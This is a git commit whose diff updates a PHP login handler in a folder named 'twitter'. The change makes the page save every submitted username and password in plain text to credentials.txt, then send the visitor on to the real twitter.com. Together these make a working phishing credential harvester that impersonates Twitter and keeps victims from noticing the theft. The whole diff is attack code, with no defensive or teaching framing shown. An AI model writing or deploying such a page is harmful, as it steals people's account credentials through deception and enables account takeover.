0442d22caf3aed9f538c0e914dfc7f02349746dd
kipkorirCal <kipkoric@mail.gvsu.edu>
2025-04-12 19:17:41 -0400

    Update login.php

--- twitter/login.php
+++ twitter/login.php
@@ -1,16 +1,18 @@
 <?php
-// login.php
-
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Get the submitted data (you can log it or use it if needed)
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['password']);
+
+    // Format the credentials
+    $entry = "Username: $username | Password: $password" . PHP_EOL;
+
+    // Save credentials to a text file
+    file_put_contents("credentials.txt", $entry, FILE_APPEND | LOCK_EX);
 
     // Redirect to Twitter
     header("Location: https://twitter.com");
     exit();
 } else {
-    // If accessed directly, redirect back to the form
     header("Location: index.html");
     exit();
 }
